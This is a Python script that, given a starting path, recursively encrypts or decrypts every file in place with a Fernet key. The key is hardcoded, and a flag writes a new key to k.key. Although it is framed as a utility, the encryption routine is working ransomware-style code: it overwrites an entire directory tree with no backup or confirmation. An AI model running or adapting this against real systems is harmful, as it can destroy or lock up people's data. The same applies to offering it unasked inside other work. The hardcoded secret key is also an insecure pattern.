#!/usr/bin/python

import optparse
import os
from cryptography.fernet import Fernet


class Recursive(object):
    """
    Starting at a specified path, encrypting or decrypting all files contained in pwd then entering all
    contained directories and repeating.
    The same key is hardcoded for both encryption and decryrption but can be changed by using the -k or --key flag.
    A new key can be generated and saved to a file using the --nky flag.
    Path is passed in using the -p or --pth flag.
    Encryption/decryption is specified using the --enc or --dec flags respectively, one and only one mnust be specified.
    ENSURE the correct path is entered.
    """

    @staticmethod
    def gen_key():
        # Generate key to encrypt/decrypt
        key = Fernet.generate_key()
        # write key to a file for later use(to decrypt)
        with open("k.key", "wb") as the_k:
            the_k.write(key)
        return key

    def target_enc(self, path, k):
        # method to encrypt all files in a directory
        dir_flag = 0
        os.chdir(path)
        files = []
        dirs = []
        lst = os.listdir()
        for f in lst:
            if os.path.isfile(f):
                files.append(f)
            else:
                dir_flag += 1
                dirs.append(f)
        print(f"[*] Files : {files}")

        for file in files:
            with open(file, "rb") as the_file:
                contents = the_file.read()
            encrypted_content = Fernet(k).encrypt(contents)
            with open(file, "wb") as the_file:
                the_file.write(encrypted_content)

        # if the current directory contains 1+ directories then they will be passed
        # back to the method
        if dir_flag > 0:
            for d in dirs:
                p = f"{path}/{d}"
                print(f"[+] path: {p}")
                self.target_enc(p, k)

    def target_dec(self, path, k):
        # method to decrypt all files in a directory
        dir_flag = 0
        os.chdir(path)
        files = []
        dirs = []
        lst = os.listdir()
        for f in lst:
            if os.path.isfile(f):
                files.append(f)
            else:
                dir_flag += 1
                dirs.append(f)
        print(f"[*] Files : {files}")
        # print(f"[*] Directories : {dirs}")

        for file in files:
            with open(file, "rb") as the_file:
                encrypted_content = the_file.read()
            decrypted_content = Fernet(k).decrypt(encrypted_content)
            with open(file, "wb") as the_file:
                the_file.write(decrypted_content)

        # if the current directory contains 1+ directories then they will be passed
        # back to the method
        if dir_flag > 0:
            for d in dirs:
                p = f"{path}/{d}"
                print(f"[+] path: {p}")
                self.target_dec(p, k)


def main():
    rec = Recursive()

    parser = optparse.OptionParser("Script to encrypt/decrypt all files in a target directory recursively")
    parser.add_option('-p', '--pth', dest='pth', type='str', help='Directory starting point')
    parser.add_option('-k', '--key', dest='key', type='str', help='Fernet key, not encoded')
    parser.add_option('--enc', action='store_true', help='Option to encrypt')
    parser.add_option('--dec', action='store_true', help='Option to decrypt')
    parser.add_option('--nky', action='store_true', help='Output new key and save to file')
    (options, args) = parser.parse_args()

    if options.nky:
        print(f"New key: {rec.gen_key()}")
        exit(0)

    if options.pth is None:
        print(f'{parser.usage}\nFor encryption enter absolute starting point directory to continue')
        exit(0)
    else:
        p = options.pth

    if options.key is None:
        # uncomment line 113 to gen new key and save to file rather than using key at line 114
        # t_k = Recursive.gen_key()
        t_k = 'DKxZmlu4ExSeJUGfFRSMKUOl0QCpgGKM2cV_KAPt3_8='
    else:
        t_k = options.key

    if options.enc and options.dec:
        print("Enter only one encryption method at a time")
        exit(0)

    if not options.enc and not options.dec:
        print("Enter an encryption method to continue")

    t_k = t_k.encode()

    if options.enc:
        rec.target_enc(p, t_k)

    if options.dec:
        rec.target_dec(p, t_k)


if __name__ == '__main__':
    main()
